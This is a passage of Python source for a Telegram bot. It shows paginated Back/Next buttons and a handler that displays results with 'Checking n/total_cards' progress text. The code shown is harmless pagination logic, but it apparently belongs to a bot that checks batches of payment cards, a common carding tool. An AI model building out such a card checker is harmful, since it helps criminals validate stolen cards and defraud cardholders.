        row.append(InlineKeyboardButton(text="Back", callback_data=f"sh_prev_{msg_id}", icon_custom_emoji_id="5042097984083330584", style="danger"))
    if current < pages - 1:
        row.append(InlineKeyboardButton(text="Next", callback_data=f"sh_next_{msg_id}", icon_custom_emoji_id="5042097984083330584", style="primary"))

    return InlineKeyboardMarkup(inline_keyboard=[row]) if row else None


@router.callback_query(F.data.startswith("sh_"))
async def sh_callback_handler(callback: types.CallbackQuery):
    data = callback.data
    parts = data.split("_")

    if len(parts) < 3:
        return
    try:
        msg_id = int(parts[2])
    except (ValueError, IndexError):
        return

    state = SH_SESSIONS.get(msg_id)
    if not state:
        await callback.answer("Session expired.", show_alert=True)
        return

    if callback.from_user.id != state["user_id"]:
        await callback.answer("<tg-emoji emoji-id='4915853119839011973'>⚠️</tg-emoji> 𝗬𝗼𝘂 𝗰𝗮𝗻𝗻𝗼𝘁 𝗶𝗻𝘁𝗲𝗿𝗮𝗰𝘁 𝘄𝗶𝘁𝗵 𝘁𝗵𝗶𝘀 𝗺𝗲𝗻𝘂.", show_alert=True)
        return

    await callback.answer()

    action = parts[1]
    total_results = len(state["results"])
    total_pages = (total_results + 5) // 6

    if action == "next" and state["page"] < total_pages - 1:
        state["page"] += 1
    elif action == "prev" and state["page"] > 0:
        state["page"] -= 1

    elapsed = state.get("elapsed_final", round(time.time() - state["start_time"], 2))

    text = format_page_content(state, elapsed, is_working=False)
    if len(state["results"]) < state["total_cards"]:
        text += f"\n\n<tg-emoji emoji-id='5039579582764680065'>⏳</tg-emoji> <b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 {len(state['results'])}/{state['total_cards']}...</b>"
    else:
        text += "\n\n<tg-emoji emoji-id='5039844895779455925'>🍾</tg-emoji> <b>𝗖𝗵𝗲𝗰𝗸 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲.</b>"

    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
    except Exception:
        pass